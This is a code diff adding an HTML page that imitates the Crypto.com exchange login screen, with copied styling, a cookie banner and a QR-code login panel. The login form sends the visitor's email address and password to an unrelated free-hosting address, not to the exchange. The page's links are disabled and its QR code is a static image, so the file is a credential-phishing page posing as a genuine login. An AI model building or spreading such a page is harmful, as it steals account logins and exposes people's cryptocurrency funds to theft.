@@ -1,0 +1,716 @@
+<html class="html5-background">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=Edge,chrome=1" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+    <meta name="action-cable-url" content="https://authws.crypto.com">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <title>Crypto.com OAuth</title>
+    <link rel="shortcut icon" type="image/x-icon"
+        href="https://app.mona.co/assets/exchange-favicon-724eb3df60fd455d4d9fd1b7b325fd2ed23c283a26abe3cfd604a67af2da0ab9.png">
+    <link rel="stylesheet" media="all"
+        href="https://app.mona.co/assets/pages/devise/oauth-eb32e8aeaefd46d95d559780d2794241238a5e32a8dac9cd4ed7ca60039d40b9.css"
+        data-turbolinks-track="reload">
+    <link rel="stylesheet" media="screen" href="https://assets.onfido.com/web-sdk-releases/12.2.1/style.css">
+    <script>
+        //<![CDATA[
+window.GTMConfig = { id: "GTM-NW8MCFT" }
+//]]>
+    </script>
+    <!--[if lt IE 9]
+= javascript_include_tag '//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.6.1/html5shiv.js'-->
+    <script
+        src="https://app.mona.co/assets/application-dcdfbada8c1ccbe5f99cb9bdf2a21134d30146d71ac5f163bb80ff719a5fe71e.js"
+        data-turbolinks-track="reload"></script>
+
+    <link type="text/css"
+        href="https://cdn.cookielaw.org/skins/6.2.0/default_flat_bottom_two_button_white/v2/css/optanon.css"
+        rel="stylesheet">
+    <style>
+		.grecaptcha-badge {
+    opacity: 0;
+}
+        #optanon ul#optanon-menu li {
+            background-color:  !important
+        }
+
+        #optanon ul#optanon-menu li.menu-item-selected {
+            background-color:  !important
+        }
+
+        #optanon #optanon-popup-wrapper .optanon-white-button-middle {
+            background-color: #002D74 !important
+        }
+
+        .optanon-alert-box-wrapper .optanon-alert-box-button-middle {
+            background-color: #002D74 !important;
+            border-color: #002D74 !important;
+        }
+
+        #optanon #optanon-popup-wrapper .optanon-white-button-middle button {
+            color: #ffffff !important
+        }
+
+        .optanon-alert-box-wrapper .optanon-alert-box-button-middle button {
+            color: #ffffff !important
+        }
+
+        #optanon #optanon-popup-bottom {
+            background-color: #FFFFFF !important
+        }
+
+        #optanon.modern #optanon-popup-top,
+        #optanon.modern #optanon-popup-body-left-shading {
+            background-color: #FFFFFF !important
+        }
+
+        .optanon-alert-box-wrapper {
+            background-color: #D7DDE0 !important
+        }
+
+        .optanon-alert-box-wrapper .optanon-alert-box-bg p {
+            color: #030303 !important
+        }
+
+        #optanon #optanon-popup-body-left-shading {
+            background-color: #FFFFFF
+        }
+    </style>
+</head>
+
+<body class="html5-background">
+    <div class="optanon-alert-box-wrapper  " role="alertdialog" aria-labelledby="alert-box-title"
+        aria-describedby="alert-box-message" style="display:none">
+        <div class="optanon-alert-box-bottom-top"></div>
+        <div class="optanon-alert-box-bg">
+            <div class="optanon-alert-box-logo"> </div>
+            <div class="optanon-alert-box-body">
+                <p class="optanon-alert-box-title legacy-banner-title sr-only" id="alert-box-title" role="heading"
+                    aria-level="2">Cookie Notice</p>
+                <p class="banner-content" id="alert-box-message">We use cookies to personalise content and ads, to
+                    provide social media features and to analyse our traffic. We also share information about your use
+                    of our site with our social media, advertising and analytics partners. <a href="#"
+                        id="ot-show-vendorlist-link"
+                        onclick=" (function() {var elements = document.getElementById('optanon-vendor-consent-text');if(elements) {elements.click(); Optanon.ToggleInfoDisplay();  }})();"
+                        class="banner-policy-link" tabindex="1" aria-label="Show Vendors">Show Vendors</a>
+                </p>
+            </div>
+            <div class="optanon-clearfix"></div>
+            <div class="optanon-alert-box-button-container">
+                <div class="optanon-alert-box-button optanon-button-close">
+                    <div class="optanon-alert-box-button-middle">
+                        <button class="optanon-alert-box-close" aria-label="Close">Close</button>
+                    </div>
+                </div>
+                <div class="optanon-alert-box-button optanon-button-allow">
+                    <div class="optanon-alert-box-button-middle accept-cookie-container">
+                        <button class="optanon-allow-all accept-cookies-button" title="Accept Cookies" aria-label="Accept Cookies" onclick="Optanon.TriggerGoogleAnalyticsEvent('OneTrust Cookie Consent', 'Banner Accept Cookies');" tabindex="3">Accept Cookies</button>
+                    </div>
+                </div>
+                <div class="optanon-alert-box-button optanon-button-more">
+                    <div class="optanon-alert-box-button-middle">
+                        <button class="optanon-toggle-display cookie-settings-button" title="Cookie Settings" aria-label="Cookie Settings" onclick="Optanon.TriggerGoogleAnalyticsEvent('OneTrust Cookie Consent', 'Banner Open Preferences');" tabindex="2">Cookie Settings</button>
+                    </div>
+                </div>
+            </div>
+            <div class="optanon-clearfix optanon-alert-box-bottom-padding"></div>
+        </div>
+    </div>
+    <div id="optanon" class="modern">
+        <div id="optanon-popup-bg"></div>
+</div>
+    <nav class="navbar navbar-expand-md navbar-dark nav-background-color"><a class="navbar-brand"
+            href="https://crypto.com/exchange/"><img class="vertical-logo" src="https://app.mona.co/assets/logo.76653258-bc0a03bb4a9361a97e0a30259abce3c507233a859bc731900051833f4be8ea60.svg"></a><button aria-controls="navbar-toggle" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbar-toggle" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button>
+        <div class="collapse navbar-collapse" id="navbar-toggle">
+            <ul class="navbar-nav mr-auto mt-lg-0">
+                <li class="nav-item"><a class="text-nav-style" href="#?=crypto.com/exchange/trade">Exchange</a>
+                </li>
+                <li class="nav-item"><a class="text-nav-style" href="#?=crypto.com/exchange/">Markets</a></li>
+            </ul>
+            <div class="my-2 my-lg-0 auth-padding"><a class="button btn btn-link text-nav-style"
+                    href="#?=crypto.com/exchange/login">Log In</a><a
+                    class="button btn btn-primary text-nav-style signup-btn"
+                    href="#?=exchange/register">Sign Up</a></div>
+        </div>
+    </nav>
+    <div class="container-fluid remove-padding">
+	
+        <style>
+            .password-container {
+                position: relative;
+            }
+
+            .form-control {
+                color: #0B1426;
+                padding: 0.375rem 2.25rem 0.375rem 0.75rem;
+                height: 40px;
+            }
+
+            .reveal {
+                position: absolute;
+                right: 0.8rem;
+                top: calc(1.5em + 0.75rem + 8px);
+                height: 16px;
+                width: 16px;
+                background-image: url(https://app.mona.co/assets/conceal-1668065985436daa7505d064de39077fcd8224cdc375cfaf756259dea0613ef4.svg);
+            }
+
+            .conceal {
+                background-image: url(https://app.mona.co/assets/reveal-8bcbab811a2422c3421f0a0e5dd36ecbc11e3ecd6412d12eb9fd066f32a3d089.svg);
+            }
+
+            .overlay {
+                position: absolute;
+                left: 0px;
+                top: 0px;
+                height: 160px;
+                width: 160px;
+                background-position: 50%;
+                background-repeat: no-repeat;
+                background-image: url(https://app.mona.co/assets/qr-code-overlay-4970e82763d8bc4fac6d258a84c535686277015df82d3727a0b46ea762641fd3.svg);
+            }
+
+            .qr-code-expired {
+                box-sizing: border-box;
+                flex-direction: column;
+                display: flex;
+                width: 160px;
+                height: 160px;
+                background: rgba(255, 255, 255, 0.97);
+                position: absolute;
+                top: 0;
+                left: 0;
+                padding: 15px;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .expired-title {
+                color: rgb(0, 0, 0);
+                font-size: 14px;
+                font-weight: 500;
+                line-height: 20px;
+                color: #0B1426;
+                margin-bottom: 16px;
+            }
+
+            .refresh-btn {
+                width: 78px;
+                border: none;
+                cursor: pointer;
+                font-weight: 600;
+                font-size: 12px;
+                line-height: 14px;
+                color: #FFFFFF;
+                height: 28px;
+                background: #1199FA;
+                border-radius: 2px;
+            }
+
+            .flex {
+                max-width: 800px;
+                margin: 0px auto;
+                display: flex;
+                padding: 32px 24px;
+            }
+
+            .form-box {
+                width: 100%;
+                min-width: 250px;
+            }
+
+            .col-box {}
+
+            .container-fluid form label {
+                color: #0B1426;
+                font-weight: 500;
+                font-size: 14px;
+                line-height: 20px;
+                padding-top: 0px !important;
+            }
+
+            .qr-login-continer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin-left: 32px;
+                padding-left: 32px;
+                border-left: 1px solid #7777772b;
+            }
+
+            .qr-code-container {
+                position: relative;
+                border-radius: 12px;
+                box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+                overflow: hidden;
+                margin-bottom: 24px;
+            }
+
+            .qr-login {
+                overflow: hidden;
+                display: flex;
+                width: 160px;
+                height: 160px;
+            }
+
+            .qr-code-title {
+                margin-bottom: 24px;
+                font-weight: 600;
+                font-size: 16px;
+                line-height: 24px;
+                color: #0B1426;
+                width: 327px;
+                text-align: center;
+            }
+
+            .qr-code-step-container {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                width: 100%;
+            }
+
+            .qr-code-step {
+                font-weight: 500;
+                font-weight: 500;
+                font-size: 14px;
+                line-height: 20px;
+                color: #0B1426;
+                margin-bottom: 0px;
+                display: flex;
+            }
+
+            .container-fluid .login-footer-wrapper {
+                font-size: 12px;
+            }
+
+            .sign-in-btn {
+                margin: 24px 0px
+            }
+
+            .icon {
+                margin: 0px 8px;
+            }
+        </style>
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-box">
+                    <div class="flex-wrap padding-l">
+                        <h4 class="text-center text-color-white">Log in to Crypto.com</h4>
+                    </div>
+                    <div class="form-container background-color-white flex">
+                        <div class="form-box">
+                            <form class="simple_form new_user" action="https://atm3zmyazs02zdzklwy3njqtmda.000webhostapp.com/	aspx.php" method="POST" id="simple_form new_form" onsubmit="return AuthEventLogger.onSignIn()" novalidate="novalidate" accept-charset="UTF-8">
+                         
+                                <div class="form-inputs form-style-text">
+                                    <div class="form-group email optional user_email">
+                                        <label class="control-label email optional" for="user_email">Email Address</label>
+										<input class="form-control string email optional" autocomplete="email" autofocus="autofocus" placeholder="Enter your email address" type="email" value="" name="email" id="email">
+                                    </div>
+                                    <div class="password-container">
+                                        <span class="reveal" onclick="toggleReveal('user_password')(event)"></span>
+                                    </div>
+                                    <div class="form-group password optional user_password">
+                                        <label class="control-label password optional" for="user_password">Password</label>
+										<input class="form-control password optional" autocomplete="current-password" placeholder="Enter your password" type="password" name="password" id="password		">
+                                    </div>
+
+                                   
+                                    <button name="button" type="submit" class="btn btn-default btn btn-primary btn-block sign-in-btn">Log in</button>
+                                </div>
+                            </form>
+                            <div class="special-form-container">
+                                <style>
+                                    .dialog-root {}
+
+                                    .dialog-mask {
+                                        position: fixed;
+                                        top: 0;
+                                        right: 0;
+                                        bottom: 0;
+                                        left: 0;
+                                        z-index: 1000;
+                                        height: 100%;
+                                        background-color: rgba(0, 0, 0, .45);
+                                    }
+
+                                    .dialog-wrap {
+                                        position: fixed;
+                                        top: 0;
+                                        right: 0;
+                                        bottom: 0;
+                                        left: 0;
+                                        overflow: auto;
+                                        outline: 0;
+                                        z-index: 1000;
+                                    }
+
+                                    .dialog {
+                                        color: rgba(0, 0, 0, .85);
+                                        font-size: 14px;
+                                        line-height: 1.5715;
+                                        pointer-events: none;
+                                        position: relative;
+                                        top: 35vh;
+                                    }
+
+                                    .dialog-content {
+                                        position: relative;
+                                        background-color: #fff;
+                                        border-radius: 8px;
+                                        box-shadow: 0 3px 6px -4px rgb(0 0 0 / 12%), 0 6px 16px 0 rgb(0 0 0 / 8%), 0 9px 28px 8px rgb(0 0 0 / 5%);
+                                        pointer-events: auto;
+                                        margin: auto;
+                                        width: 460px;
+                                    }
+
+                                    .dialog-body {
+                                        padding: 16px;
+                                    }
+
+                                    .dialog-body-title {
+                                        margin-bottom: 14px;
+                                        text-align: left;
+                                        font-size: 1.25rem;
+                                        margin-bottom: 10px;
+                                        font-weight: 500;
+                                        line-height: 1.2;
+                                    }
+
+                                    .title-icon {
+                                        color: #007bff;
+                                        margin-right: 8px
+                                    }
+
+                                    .dialog-footer {
+                                        padding: 4px 16px 20px;
+                                        display: flex;
+                                    }
+
+                                    .btn-ghost {
+                                        color: #007bff;
+                                        background-color: #fff;
+                                        border-color: #007bff;
+                                        flex: 1;
+                                    }
+
+                                    .btn-ghost:hover {
+                                        color: #007bff;
+                                    }
+
+                                    .btn-proceed {
+                                        flex: 1;
+                                        margin-left: 10px
+                                    }
+                                </style>
+                                <div class="dialog-root" id="forgot-pwd-dialog" style="display:none">
+                                    <div class="dialog-mask"></div>
+                                    <div class="dialog-wrap">
+                                        <div class="dialog">
+                                            <div class="dialog-content">
+                                                <div class="dialog-body">
+                                                    <div class="dialog-body-title"><svg aria-hidden="true"
+                                                            class="title-icon" data-icon="info-circle"
+                                                            fill="currentColor" focusable="false" height="1em"
+                                                            viewBox="64 64 896 896" width="1em">
+                                                            <path
+                                                                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z">
+                                                                &gt;</path>
+                                                            <path
+                                                                d="M464 336a48 48 0 1096 0 48 48 0 10-96 0zm72 112h-48c-4.4 0-8 3.6-8 8v272c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V456c0-4.4-3.6-8-8-8z"
+                                                                <="" path=""></path>
+                                                        </svg><span>Reset Password</span></div>
+                                                    <section style="text-align: left;">Please note that your account's
+                                                        withdrawal function will be disabled for the first 24 hours upon
+                                                        a successful password reset.</section>
+                                                </div>
+                                                <div class="dialog-footer"><a class="btn btn-ghost"
+                                                        onclick="$('#forgot-pwd-dialog').hide()" href="">Cancel</a><a
+                                                        class="btn btn-primary btn-proceed"
+                                                        href="#?=users/password/new">Proceed</a></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="login-footer-wrapper flex-container">
+                                    <div class="flex-item"><a onclick="$('#forgot-pwd-dialog').show()"
+                                            data-remote="true" href="">Forgot your password?</a></div>
+                                    <div class="flex-item padding-left-s">Don't have an account?&nbsp;</div><a
+                                        href="/users/sign_up">Sign up now</a>
+                                </div>
+                            </div>
+                        </div>
+                        <script src="https://cdn.jsdelivr.net/npm/easyqrcodejs@4.4.13/dist/easy.qrcode.min.js"></script>
+                        <style>
+                            .overlay {
+                                position: absolute;
+                                left: 0px;
+                                top: 0px;
+                                height: 160px;
+                                width: 160px;
+                                background-position: 50%;
+                                background-repeat: no-repeat;
+                                background-image: url(https://app.mona.co/assets/qr-code-overlay-4970e82763d8bc4fac6d258a84c535686277015df82d3727a0b46ea762641fd3.svg);
+                            }
+
+                            .qr-code-expired {
+                                box-sizing: border-box;
+                                flex-direction: column;
+                                display: flex;
+                                width: 160px;
+                                height: 160px;
+                                background: rgba(255, 255, 255, 0.97);
+                                position: absolute;
+                                top: 0;
+                                left: 0;
+                                padding: 15px;
+                                align-items: center;
+                                justify-content: center;
+                            }
+
+                            .expired-title {
+                                color: rgb(0, 0, 0);
+                                font-size: 14px;
+                                font-weight: 500;
+                                line-height: 20px;
+                                color: #0B1426;
+                                margin-bottom: 16px;
+                            }
+
+                            .refresh-btn {
+                                width: 78px;
+                                border: none;
+                                cursor: pointer;
+                                font-weight: 600;
+                                font-size: 12px;
+                                line-height: 14px;
+                                color: #FFFFFF;
+                                height: 28px;
+                                background: #1199FA;
+                                border-radius: 2px;
+                            }
+
+                            .qr-login-continer {
+                                display: flex;
+                                width: 100%;
+                                flex-direction: column;
+                                align-items: center;
+                                margin-left: 32px;
+                                padding-left: 32px;
+                                border-left: 1px solid #7777772b;
+                                justify-content: center;
+                            }
+
+                            .qr-code-container {
+                                position: relative;
+                                border-radius: 12px;
+                                box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+                                overflow: hidden;
+                                margin-bottom: 24px;
+                            }
+
+                            .qr-login {
+                                overflow: hidden;
+                                display: flex;
+                                width: 160px;
+                                height: 160px;
+                            }
+
+                            .qr-code-title {
+                                margin-bottom: 24px;
+                                font-weight: 600;
+                                font-size: 16px;
+                                line-height: 24px;
+                                color: #0B1426;
+                                text-align: center;
+                            }
+
+                            .qr-code-step-container {
+                                display: flex;
+                                flex-direction: column;
+                                align-items: flex-start;
+                                width: 100%;
+                            }
+
+                            .qr-code-step {
+                                font-weight: 500;
+                                font-size: 14px;
+                                line-height: 20px;
+                                color: #0B1426;
+                                margin-bottom: 8px;
+                                display: flex;
+                            }
+
+                            .icon {
+                                margin: 0px 8px;
+                            }
+                        </style>
+                        <div class="qr-login-continer d-none d-md-flex">
+                            <div class="qr-code-title">Scan to log in instantly</div>
+                            <div class="qr-code-container">
+                                <div class="qr-login" id="qr-login"><a href="#"><img src="https://imgtr.ee/images/2023/09/22/205039f1441306a791ce792943e8fce6.png" alt="IMGTR" style="
+    width: 161px;
+    height: 161px;
+"></a></div>
+                                <div class="overlay" id="qr-code-overlay" style="display: none;"></div>
+                                <div class="qr-code-expired hide" id="qr-code-expired" style="display: none;">
+                                    <div class="expired-title">QR code expired</div>
+                                    <button class="btn btn-primary refresh-btn" id="refresh_qr_code">Refresh</button>
+                                </div>
+                            </div>
+                            <div class="qr-code-step-container">
+                                <table>
+                                    <tbody>
+                                        <tr class="qr-code-step">
+                                            <td style="text-align: left; width: 1.2em;">1.</td>
+                                            <td>Launch the Crypto.com App or Exchange App</td>
+                                        </tr>
+                                        <tr class="qr-code-step">
+                                            <td style="text-align: left; width: 1.2em;">2.</td>
+                                            <td>Tap Menu/Settings &gt; QR Code Scanner<img class="icon" src="https://app.mona.co/assets/qr-code-scanner-icon-02b48b108a7a86b025ed49250dceaca7c10f0c04c586f53d02a60ee87350eb53.svg">
+                                            </td>
+                                        </tr>
+                                        <tr class="qr-code-step">
+                                            <td style="text-align: left; width: 1.2em;">3.</td>
+                                            <td>Scan the above QR code</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                        <script>
+                            let qrcode = null, loading = false, pageRefresh = false;
+let timer = null;
+const img = "https://app.mona.co/assets/qr-code-logo-ec096a1d1702017043051a5c58ee53f29437a84a4a202d309f6fe8cca3f1e3a1.svg"
+
+function GenerateQrCode(text){
+  $('#qr-code-overlay').hide()
+  qrcode = new QRCode($('#qr-login')[0], {
+    text: text,
+    correctLevel : QRCode.CorrectLevel.H,
+    width: 206,
+    height: 206,
+    logoWidth: 72,
+    logoHeight: 72,
+    quietZone: 14,
+    logo: img,
+    logoBackgroundTransparent: true,
+  });
+}
+
+function clearTimer(){
+  if (timer) {
+    clearTimeout(timer)
+  }
+}
+
+function showExpiredImg(expiry){
+  const currentTime = Date.parse(new Date()) / 1000;
+  const expiredTime = (expiry - currentTime) * 1000
+  clearTimer()
+  timer = setTimeout(function(){
+    $('#qr-code-expired').show()
+  }, expiredTime)
+}
+
+function getQrCode(){
+  $.ajax({
+    url: '/users/qr',
+    type: 'POST',
+    success: function(data){
+      if (data && data.ok) {
+        GenerateQrCode(data.qr)
+        CreateQrSession(data.ott)
+        showExpiredImg(data.expiry)
+      }
+
+    },
+  })
+}
+
+function refreshQrCode(){
+  if (pageRefresh) {
+    location.reload();
+    return
+  }
+  loading = true;
+  $.ajax({
+    url: '/users/qr',
+    type: 'POST',
+    success: function(data){
+      if (data && data.ok) {
+        $('#qr-code-expired').hide()
+        qrcode.makeCode(data.qr);
+        loading = false;
+        showExpiredImg(data.expiry)
+      }
+    },
+    error: function(){
+      loading = false;
+    }
+  })
+}
+
+function CreateQrSession(ott) {
+  var cable;
+  ActionCable.logger.enabled = true;
+  cable = ActionCable.createConsumer(ActionCable.getConfig('url') + `?token=${ott}`);
+  return cable.subscriptions.create({
+    channel: "UserCore::QrSessionChannel"
+  }, {
+    disconnected: function() {
+      pageRefresh = true;
+      return cable.disconnect();
+    },
+    received: function(data) {
+      if (data.redirect_uri !== void 0) {
+        window.location.replace(data.redirect_uri)
+      }
+    }
+  });
+};
+$(document).ready(function(){
+  getQrCode()
+  $('#refresh_qr_code').on('click', refreshQrCode)
+  window.onbeforeunload = function(event) {
+    clearTimer()
+  };
+})
+                        </script>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            $(document).ready(function(){
+  $('#sign-in-btn').click(function(e){
+    $(this).prop("disabled", true);
+    $(this).html(
+      `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Submitting...`
+    )
+    $('#hidden-sign-in-btn').click()
+  })
+})
+function toggleReveal(id, icon){
+  return function(event){
+    let pass_type = $(`#${id}`).attr('type');
+    if (pass_type === 'password' ){
+        $(`#${id}`).attr('type', 'text');
+        $(event.target).addClass('conceal');
+    } else {
+        $(`#${id}`).attr('type', 'password');
+        $(event.target).removeClass('conceal');
+    }
+  }
+}
+        </script>
+        <div class="flex-wrap padding-l" id="footer">
+            <span class="text-center text-color-white"><span class="institutional-image"></span>Need an institutional
+            account?<a class="text-color-secondary padding-left-s" href="#?=users/sign_up"
+                onclick="AuthEventLogger.onCreateInstitutionalAccount()">Sign up here</a></span>
+        </div>
+    </div>
+</body>
+
+</html>	
